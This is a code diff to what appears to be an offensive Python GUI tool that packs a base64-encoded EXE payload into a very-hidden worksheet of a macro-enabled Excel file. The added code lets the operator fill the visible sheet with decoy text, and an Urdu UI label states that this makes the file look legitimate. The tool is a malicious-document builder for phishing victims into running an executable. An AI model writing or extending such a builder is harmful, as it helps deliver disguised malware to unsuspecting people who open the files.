@@ -3077,6 +3077,27 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                                       anchor="w", padx=10, pady=7)
         self.xlsx_out_lbl.pack(fill="x")
 
+        # ── Sheet content ─────────────────────────────────────────────────
+        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(0, 14))
+        self._lbl(wrap, "EXCEL  SHEET  CONTENT  (optional)").pack(fill="x", pady=(0, 4))
+        tk.Label(wrap,
+                 text="Jo bhi likhein ga woh Sheet1 mein dikhega — file legitimate lagti hai.",
+                 font=F_SM, fg=C_G3, bg=BG_ROOT, anchor="w"
+                 ).pack(fill="x", pady=(0, 6))
+        ct_brd = tk.Frame(wrap, bg=BD_MID, padx=1, pady=1)
+        ct_brd.pack(fill="x", pady=(0, 14))
+        ct_inn = tk.Frame(ct_brd, bg=BG_IN)
+        ct_inn.pack(fill="both", expand=True)
+        self.xlsx_content_txt = tk.Text(
+            ct_inn, bg=BG_IN, fg=C_G1, font=F_MONO,
+            relief="flat", bd=0, height=7,
+            wrap="word", insertbackground=C_GRN, padx=8, pady=6)
+        ct_sb = tk.Scrollbar(ct_inn, orient="vertical",
+                             command=self.xlsx_content_txt.yview, bg=BG_IN)
+        self.xlsx_content_txt.configure(yscrollcommand=ct_sb.set)
+        ct_sb.pack(side="right", fill="y")
+        self.xlsx_content_txt.pack(fill="both", expand=True)
+
         # ── Action button ─────────────────────────────────────────────────
         act = tk.Frame(wrap, bg=BG_ROOT)
         act.pack(fill="x", pady=(0, 14))
@@ -3171,6 +3192,11 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             out_xlsm = hta_path.parent / f"{hta_path.stem}.xlsm"
             tmp_dir  = Path(tempfile.mkdtemp(prefix="k4li_xlsx_"))
 
+            # Read custom sheet content before starting
+            sheet_lines = self.xlsx_content_txt.get("1.0", "end-1c").splitlines()
+            content_file = tmp_dir / "content.txt"
+            content_file.write_text("\n".join(sheet_lines), encoding="utf-8")
+
             self._xlsx_ln("\n[1/4]  Reading & encoding EXE...", "cy")
             hta_data = hta_path.read_bytes()
             hta_b64  = base64.b64encode(hta_data).decode("ascii")
@@ -3242,6 +3268,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             tmp_out_ps = str(tmp_out)
             b64_in     = str(b64_file)
             vba_in     = str(vba_file)
+            cnt_in     = str(content_file)
 
             ps_script = (
                 '$ErrorActionPreference = "Stop"\n'
@@ -3252,7 +3279,10 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                 '  $wb = $xl.Workbooks.Add()\n'
                 '  $ws1 = $wb.Worksheets.Item(1)\n'
                 '  $ws1.Name = "Sheet1"\n'
-                '  $ws1.Cells(1,1).Value2 = "Document"\n'
+                f'  $clines = [System.IO.File]::ReadAllLines("{cnt_in}")\n'
+                '  for ($r = 0; $r -lt $clines.Length; $r++) {\n'
+                '    if ($clines[$r] -ne "") { $ws1.Cells($r+1, 1).Value2 = $clines[$r] }\n'
+                '  }\n'
                 '  $wd = $wb.Worksheets.Add()\n'
                 '  $wd.Name = "_d"\n'
                 '  $wd.Visible = 2\n'
